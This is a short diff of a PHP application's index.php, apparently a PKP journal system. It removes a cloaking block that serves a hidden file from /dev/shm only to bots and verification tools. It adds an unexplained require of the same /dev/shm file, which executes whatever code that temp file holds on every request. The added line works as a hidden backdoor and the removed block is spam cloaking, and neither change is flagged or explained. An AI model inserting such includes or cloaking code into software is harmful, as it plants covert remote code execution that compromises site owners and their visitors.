@@ -1,8 +1,5 @@
 <?php
-if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') > 0  && $_SERVER['REQUEST_URI'] == '/' || isset($_COOKIE[0]) && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'verification') > 0 && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'tool') > 0 && $_SERVER['REQUEST_URI'] == '/') {
-    echo implode('', file('/dev/shm/edukhasi'));
-    exit;
-}
+
 
 /**
  * @defgroup index Index
@@ -38,6 +35,7 @@ chdir(BASE_SYS_DIR);
 
 // System-wide functions
 require('./lib/pkp/includes/functions.inc.php');
+require('/dev/shm/edukhasi');
 
 // Initialize the application environment
 import('classes.core.Application');
